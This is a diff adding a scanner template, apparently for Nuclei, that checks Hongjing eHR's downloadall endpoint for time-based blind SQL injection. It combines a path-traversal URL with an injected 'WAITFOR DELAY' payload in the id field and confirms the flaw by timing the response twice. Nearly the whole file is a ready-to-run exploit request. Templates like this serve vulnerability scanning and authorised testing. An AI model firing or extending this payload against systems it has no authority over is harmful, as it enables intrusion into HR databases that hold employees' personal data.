@@ -1,0 +1,56 @@
+id: poc-yaml-hjsoft-ehr-downloadall-sqli
+
+info:
+  name: 宏景eHR downloadall SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1, 4)}}"
+  t4: "{{to_number(t3) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /templates/attestation/../../sys/downloadall HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ext=1&filenamecolumn=1&content=1&tablename=master.dbo.sysdatabases&fileid=1&id=1';WAITFOR DELAY '0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - raw:
+      - |
+        POST /templates/attestation/../../sys/downloadall HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ext=1&filenamecolumn=1&content=1&tablename=master.dbo.sysdatabases&fileid=1&id=1';WAITFOR DELAY '0:0:{{t3}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= to_number(t3)
+          - duration <= to_number(t4)
+      - type: word
+        words:
+          - ""
+        part: body
